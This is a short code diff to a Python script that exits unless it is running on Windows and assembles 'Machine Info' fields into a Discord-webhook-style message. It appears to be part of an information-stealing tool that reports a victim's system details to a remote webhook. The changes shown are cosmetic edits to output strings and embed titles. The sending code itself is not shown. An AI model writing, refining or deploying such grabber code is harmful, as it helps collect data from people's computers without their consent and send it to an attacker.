@@ -49,10 +49,10 @@ os_platform = platform.system()
 if os_platform == "Windows":
     print (" ")
 elif os_platform in ["Darwin", "Linux"]:
-    print(f".....")
+    print(f"ERROR")
     exit(1)
 else:
-    print(f"........")
+    print(f"ERROR")
     exit(1)
 
 def machineinfo():
@@ -85,7 +85,7 @@ def machineinfo():
         "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
         "embeds": [
             {
-                "title": "💻️ Machine Info",
+                "title": "<:cpu:1363299069040132157> Machine Info",
                 "fields": [
                     {
                         "name": "<:cpu:1363299069040132157> SYSTEM",
